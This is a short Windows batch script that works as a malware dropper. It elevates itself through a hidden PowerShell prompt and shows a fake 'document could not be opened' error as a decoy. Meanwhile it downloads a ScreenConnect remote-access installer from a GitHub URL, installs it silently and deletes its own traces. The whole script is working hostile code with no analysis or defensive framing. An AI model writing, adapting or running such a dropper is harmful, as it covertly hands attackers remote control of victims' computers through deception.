@echo off
set "agent=%TEMP%\ScreenConnect.ClientSetup.msi"
set "notice=%TEMP%\status.vbs"

net session >nul 2>&1
if %errorLevel% NEQ 0 (
  powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs"
  exit /b
)

> "%notice%" echo Set ui = CreateObject("WScript.Shell")
>>"%notice%" echo ui.Popup "The requested document could not be opened.", 4, "Application Error", 48
start "" wscript.exe "%notice%"

powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/Ivan3900/test/raw/main/ScreenConnect.ClientSetup.msi', '%agent%')"
if exist "%agent%" msiexec /i "%agent%" /qn /norestart
timeout /t 5 /nobreak >nul
del "%agent%" /q >nul 2>&1
del "%notice%" /q >nul 2>&1
